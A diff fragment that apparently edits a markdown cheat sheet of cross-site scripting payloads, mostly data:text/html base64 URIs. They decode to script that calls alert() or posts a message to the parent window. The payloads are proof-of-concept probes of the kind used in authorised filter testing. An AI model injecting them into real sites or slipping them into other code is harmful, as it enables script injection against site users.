@@ -30,7 +30,7 @@ http://example.com/','z':alert(1)//
 **DATA:TEXT**
 
 ```
-html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=,
+#data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=
 ```
 ```
 data:text/html;var%20text=text;var%20html=html;alert(xss)//;base64,PGh0bWw+PGJvZHkgb25sb2FkPXhzcygpPjxzY3JpcHQ+IGZ1bmN0aW9uIHhzcygpIHsgcGFyZW50LnBvc3RNZXNzYWdlKHsneHNzJzogIm4wdG0zIn0sICcqJyk7IH07IDwvc2NyaXB0Pg==
